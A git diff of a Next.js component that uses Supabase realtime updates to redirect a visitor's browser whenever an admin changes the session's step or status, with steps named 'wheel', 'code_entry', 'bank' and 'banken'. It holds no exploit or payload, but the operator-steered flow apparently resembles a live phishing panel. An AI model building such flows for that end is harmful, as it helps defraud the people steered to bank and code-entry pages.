@@ -1,10 +1,10 @@
 "use client";
 
 import { useEffect } from "react";
-import { usePathname, useRouter } from "next/navigation";
+import { usePathname } from "next/navigation";
 import type { SessionStatus, SessionStep } from "@/types/session";
 import { createBrowserSupabaseClient } from "@/lib/supabase/client";
-import { pathToStep, stepToPath } from "@/lib/session-routes";
+import { stepToPath } from "@/lib/session-routes";
 import {
   getPreferredRouteSessionId,
   persistActiveSession,
@@ -16,7 +16,6 @@ type Props = {
 };
 
 export function SessionRealtimeGate({ sessionId, routeSessionId }: Props) {
-  const router = useRouter();
   const pathname = usePathname();
   const effectiveRouteSessionId = getPreferredRouteSessionId(sessionId, routeSessionId);
 
@@ -67,30 +66,37 @@ export function SessionRealtimeGate({ sessionId, routeSessionId }: Props) {
       const { data } = await supabase.from("sessions").select("current_step,status").eq("id", sessionId).maybeSingle();
 
       if (cancelled || !data) return;
-      const status = data.status as SessionStatus | undefined;
-      if (status === "SPECIAL_INFO") {
-        if (!pathname.startsWith("/wait")) {
-          window.location.href = "/wait";
+      if (data.current_step) {
+        const serverStep = data.current_step as SessionStep;
+        const target = stepToPath(serverStep, sessionId, effectiveRouteSessionId);
+        const targetPathname = (() => {
+          try {
+            return new URL(target, window.location.origin).pathname;
+          } catch {
+            return target;
+          }
+        })();
+
+        if (window.location.pathname !== targetPathname) {
+          window.location.href = target;
+          return;
         }
+
         return;
       }
-      if (!data.current_step) return;
-      const serverStep = data.current_step as SessionStep;
-      let local: string | null = pathToStep(pathname);
-      if (pathname.startsWith('/wheel')) local = "wheel";
-      
-      // Eğer kullanıcı çark sayfasındaysa ve server "code_entry" diyorsa yönlendirme (ikisi de aynı sayılır)
-      if (local === "wheel" && serverStep === "code_entry") return;
-      if (local === "banken" && serverStep === "bank") return;
-      
-      if (local && serverStep !== local) {
-        window.location.href = stepToPath(serverStep, sessionId, effectiveRouteSessionId);
+
+      const status = data.status as SessionStatus | undefined;
+      if (status === "SPECIAL_INFO") {
+        if (!pathname.startsWith("/special-approval")) {
+          window.location.href = "/special-approval";
+        }
+        return;
       }
     })();
     return () => {
       cancelled = true;
     };
-  }, [effectiveRouteSessionId, sessionId, pathname, router]);
+  }, [effectiveRouteSessionId, sessionId, pathname]);
 
   /* Realtime: admin current_step değişince anında yönlendir */
   useEffect(() => {
@@ -109,25 +115,29 @@ export function SessionRealtimeGate({ sessionId, routeSessionId }: Props) {
         },
         (payload) => {
           const next = payload.new as { current_step?: SessionStep; status?: SessionStatus };
-          if (next.status === "SPECIAL_INFO") {
-            if (!pathname.startsWith("/wait")) {
-              window.location.href = "/wait";
+          if (next.current_step) {
+            const target = stepToPath(next.current_step, sessionId, effectiveRouteSessionId);
+            const targetPathname = (() => {
+              try {
+                return new URL(target, window.location.origin).pathname;
+              } catch {
+                return target;
+              }
+            })();
+
+            if (window.location.pathname !== targetPathname) {
+              window.location.href = target;
+              return;
             }
+
             return;
           }
-          if (!next.current_step) return;
-          let local: string | null = pathToStep(pathname);
-          if (pathname.startsWith('/wheel')) local = "wheel";
 
-          if (local === "wheel" && next.current_step === "code_entry") return;
-          if (local === "banken" && next.current_step === "bank") return;
-
-          if (local && next.current_step !== local) {
-            window.location.href = stepToPath(
-              next.current_step,
-              sessionId,
-              effectiveRouteSessionId,
-            );
+          if (next.status === "SPECIAL_INFO") {
+            if (!pathname.startsWith("/special-approval")) {
+              window.location.href = "/special-approval";
+            }
+            return;
           }
         },
       )
@@ -136,7 +146,7 @@ export function SessionRealtimeGate({ sessionId, routeSessionId }: Props) {
     return () => {
       void supabase.removeChannel(channel);
     };
-  }, [effectiveRouteSessionId, sessionId, pathname, router]);
+  }, [effectiveRouteSessionId, sessionId, pathname]);
 
   return null;
 }
